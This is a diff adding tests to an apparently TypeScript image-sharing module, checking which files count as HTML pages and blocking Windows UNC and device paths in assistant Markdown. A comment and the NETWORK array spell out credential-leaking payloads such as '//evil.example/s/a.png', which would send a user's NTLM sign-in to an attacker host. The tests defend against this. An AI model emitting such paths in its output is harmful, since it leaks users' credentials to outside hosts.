@@ -3,7 +3,8 @@ import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
-import { imagesInEvent, localImagePath, markdownImages, PIN_TOOL, readReplyImage, readShareImage, replyImagesInEvent } from '../../src/share-images.ts';
+import { execFileSync } from 'node:child_process';
+import { imagesInEvent, localImagePath, markdownImages, PAGE_TYPE, PIN_TOOL, readReplyImage, readShareImage, replyImagesInEvent } from '../../src/share-images.ts';
 import { tmpDir } from '../helpers/fakes.ts';
 
 test('share images: Markdown pictures on this Mac, not on the web', () => {
@@ -62,6 +63,57 @@ test('reply images: a video goes to the phone, but not to a shared page', () => 
   assert.deepEqual(replyImagesInEvent(pin, '/w', home), [{ seq: 2, path: '/w/clip.m4v', pinned: true }]);
   assert.equal(localImagePath('/w/a.mp4', home), undefined);
   assert.deepEqual(imagesInEvent(text, home), []);
+});
+
+test('reply images: a live page goes from a reply only while live pages are on, never from a pin', () => {
+  const home = '/Users/ann';
+  const base = { threadId: 't', turnId: 'u', ts: '2026-11-01T00:00:00.000Z' };
+  const text = { ...base, seq: 1, type: 'assistant.text', itemId: 'm', text: '![Garden](/w/garden.html) ![old](/w/b.HTM) ![a](/w/a.png)' } as never;
+  assert.deepEqual(replyImagesInEvent(text, '/w', home), [{ seq: 1, path: '/w/a.png', src: '/w/a.png' }]);
+  assert.deepEqual(replyImagesInEvent(text, '/w', home, true), [
+    { seq: 1, path: '/w/garden.html', src: '/w/garden.html' },
+    { seq: 1, path: '/w/b.HTM', src: '/w/b.HTM' },
+    { seq: 1, path: '/w/a.png', src: '/w/a.png' },
+  ]);
+  // Pinned mockups stay on the Mac: there are many, and nobody asked for them to go.
+  const pin = { ...base, seq: 2, type: 'tool.call', itemId: 'i', name: PIN_TOOL, kind: 'mcp', title: 'pin', input: { path: 'mock.html' } } as never;
+  assert.deepEqual(replyImagesInEvent(pin, '/w', home, true), []);
+  // A shared page never gets one.
+  assert.deepEqual(imagesInEvent(text, home), [{ seq: 1, path: '/w/a.png', src: '/w/a.png', mediaType: 'image/png' }]);
+});
+
+test('reply images: a live page has to really be a page', () => {
+  const dir = tmpDir();
+  const write = (name: string, bytes: string | Buffer) => {
+    const file = path.join(dir, name);
+    fs.writeFileSync(file, bytes);
+    return file;
+  };
+  const page = readReplyImage(write('g.html', '\uFEFF\n  <!doctype html><meta charset=utf-8><canvas></canvas><script>draw()</script>'));
+  assert.ok(!('skip' in page));
+  assert.equal(page.mediaType, PAGE_TYPE);
+  assert.ok(!('skip' in readReplyImage(write('bare.htm', '<script>document.body.append(1)</script>'))));
+  // Anything else named .html: a key, a binary, text that isn't markup.
+  assert.deepEqual(readReplyImage(write('key.html', '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n')), { skip: "it isn't a page" });
+  assert.deepEqual(readReplyImage(write('bin.html', Buffer.from([0x3c, 0x68, 0x74, 0x6d, 0x6c, 0x3e, 0, 1, 2]))), { skip: "it isn't a page" });
+  assert.deepEqual(readReplyImage(write('bad.html', Buffer.from([0x3c, 0x62, 0x3e, 0xff, 0xfe]))), { skip: "it isn't a page" });
+  assert.deepEqual(readReplyImage(write('notes.html', 'just some notes < 3 things')), { skip: "it isn't a page" });
+  // A FIFO or a device named .html is never waited on or read without end.
+  const fifo = path.join(dir, 'pipe.html');
+  if (process.platform !== 'win32') {
+    execFileSync('mkfifo', [fifo]);
+    assert.deepEqual(readReplyImage(fifo), { skip: "it can't be read" });
+    fs.symlinkSync('/dev/zero', path.join(dir, 'zero.html'));
+    assert.deepEqual(readReplyImage(path.join(dir, 'zero.html')), { skip: "it can't be read" });
+  }
+  // A link named .html to a file that isn't one, however it reads.
+  const xml = write('feed.xml', '<?xml version="1.0"?><svg><title>secret</title></svg>');
+  fs.symlinkSync(xml, path.join(dir, 'feed.html'));
+  assert.deepEqual(readReplyImage(path.join(dir, 'feed.html')), { skip: "it isn't a page" });
+  fs.symlinkSync(path.join(dir, 'g.html'), path.join(dir, 'also.html'));
+  assert.ok(!('skip' in readReplyImage(path.join(dir, 'also.html'))), 'a link to a real page is one');
+  // Markup named as a picture is still not a picture.
+  assert.deepEqual(readReplyImage(write('p.png', '<html><body>hi</body></html>')), { skip: "it isn't a picture" });
 });
 
 // The boxes of an MP4 as far as the size: ftyp, then moov > trak > tkhd.
@@ -217,5 +269,49 @@ test("share images: a real picture in a temp folder that isn't the thread's stay
     assert.equal(img?.path, shot, 'the Markdown names it');
     assert.deepEqual(readShareImage(img!.path, media), { skip: OUTSIDE });
     fs.rmSync(other, { recursive: true });
+  }
+});
+
+// The Windows port's review: assistant Markdown such as ![x](//evil.example/s/a.png)
+// would have the runner stat and read an SMB path, which sends the user's
+// NTLM sign-in to a host the text picked.
+const NETWORK = ['//evil.example/s/a.png', '\\\\evil.example\\s\\a.png', '\\\\?\\UNC\\evil.example\\s\\a.png', '//?/UNC/evil.example/s/a.png', 'file:////evil.example/s/a.png', 'file://///evil.example/s/a.png', '\\\\?\\C:\\a.png', '//./C:/a.png'];
+
+test('share images: on Windows a network or device path in Markdown is no picture to read; on a Mac or Linux a path is a path', () => {
+  const home = '/Users/ann';
+  for (const src of NETWORK) {
+    if (process.platform === 'win32') {
+      assert.equal(localImagePath(src, home), undefined, src);
+      assert.deepEqual(markdownImages(`![x](${src})`, home), [], src);
+      assert.deepEqual(imagesInEvent({ seq: 1, ts: '2026-11-06T00:00:00.000Z', type: 'assistant.text', itemId: 'm', text: `![x](${src})` } as never, home), [], src);
+    }
+  }
+  if (process.platform !== 'win32') {
+    // Unchanged: on a Mac or Linux `//evil.example/s/a.png` is just an absolute path.
+    assert.equal(localImagePath('//evil.example/s/a.png', home), '//evil.example/s/a.png');
+    assert.equal(localImagePath('/tmp/a.png', home), '/tmp/a.png');
+    assert.equal(localImagePath('/tmp/CON.png', home), '/tmp/CON.png');
+  }
+  // What a Windows path writes is still read.
+  if (process.platform === 'win32') {
+    assert.equal(localImagePath('C:\\shots\\a.png', home), 'C:\\shots\\a.png');
+    assert.equal(localImagePath('C:/shots/a.png', home), 'C:/shots/a.png');
+    assert.equal(localImagePath('file:///C:/shots/a%20b.png', home), 'C:/shots/a b.png');
+    assert.equal(localImagePath('/w/a.png', home), '/w/a.png', 'rooted on the current drive, as before');
+    assert.equal(localImagePath('C:\\shots\\CON.png', home), undefined, 'a device in a folder would hold the read');
+  }
+});
+
+test("reply images: a pinned network path is no picture, and readReplyImage won't open one", () => {
+  const base = { threadId: 't', turnId: 'u', ts: '2026-11-01T00:00:00.000Z' };
+  const pin = (p: string) => ({ ...base, seq: 4, type: 'tool.call', itemId: 'i', name: PIN_TOOL, kind: 'mcp', title: 'pin', input: { path: p } }) as never;
+  if (process.platform === 'win32') {
+    for (const p of ['//evil.example/s/a.png', '\\\\evil.example\\s\\a.png']) assert.deepEqual(replyImagesInEvent(pin(p), '/w', '/Users/ann'), [], p);
+    // Never statted: the answer is the same whether or not a host answers.
+    assert.deepEqual(readReplyImage('\\\\evil.example\\s\\a.png'), { skip: "it's a network or device path" });
+    assert.deepEqual(readReplyImage('//evil.example/s/a.png'), { skip: "it's a network or device path" });
+    assert.deepEqual(readReplyImage('C:\\x\\NUL.png'), { skip: "it's a network or device path" });
+  } else {
+    assert.deepEqual(readReplyImage('//evil.example/s/a.png'), { skip: 'the file is gone' }, 'a Mac or Linux looks, as before');
   }
 });
